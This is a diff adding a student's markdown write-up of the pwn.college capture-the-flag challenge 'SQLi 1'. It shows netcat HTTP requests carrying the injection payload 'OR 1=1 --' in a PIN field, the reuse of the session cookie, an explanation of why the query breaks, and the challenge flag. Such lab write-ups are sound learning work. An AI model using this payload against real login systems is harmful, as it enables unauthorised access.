@@ -1,0 +1,47 @@
+# challenge: SQLi 1
+
+📅 2026-02-15
+📁 web security
+
+---
+
+## ✅ what i did  
+-clicked start
+-opened the terminal
+-ran: 'cat /challenge/server'
+table=users, columns=username, pin
+admin - random number
+guest - 1337
+endpoint: /credentials
+POST-> login-name & pin
+sqlite execute the following query: SELECT rowid, * FROM users WHERE username = '{username}' AND pin = { pin }
+-ran: '/challenge/localhost'
+-ran: 'nc -v challenge.localhost 80'
+-typed: 'POST /credentials HTTP/1.1'
+        'Host: challenge.localhost'
+        'Content-Type: application/x-www-form-urlencoded'
+        'Content-Length: 32'
+        ''
+        'login-name=admin&pin=1 OR 1=1 --'
+-output: 302 FOUND
+-copied the Set-Cookie value
+-ran: 'nc -v challenge.localhost 80'
+-typed: 'GET /credentials HTTP/1.1'
+        'Host: challenge.localhost'
+        'Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ.aZI9oA.ZFlKAAyE2LKIXQBH_g-7c6_PAVE'
+-flag popped out
+
+## 🧑🏾‍🏫 what this challenge teaches u
+how to perform a basic SQLi
+in this case u just need to add OR 1=1 -- in the pin field
+  1-pin field is our target and not login-name because the session cookie the server builds is based on username. this means username=admin
+  2-pin number is impossible to guess but lookin at the query, the structure is vulnerable and we can inject our payload
+  3-the statemen OR 1=1 is always TRUE and this will make the query execute because it didnt fail
+  4-the order of query checking conditions is: NOT -> AND -> OR. in this case it will do this:
+    (username=admin AND pin=1) OR 1=1 --
+    pin is wrong making the first condition FALSE but 1=1 makes it TRUE thanks to the OR
+  5- to escape the last ' use -- to comment them out
+once get the cookie session, u just need to make a GET request including the cookie
+
+## 🏁 Flag  
+pwn.college{QHe9pXvG8ZE2VlPbpMZo8LObeKn.QXzcTN2wCO4IDOxEzW}
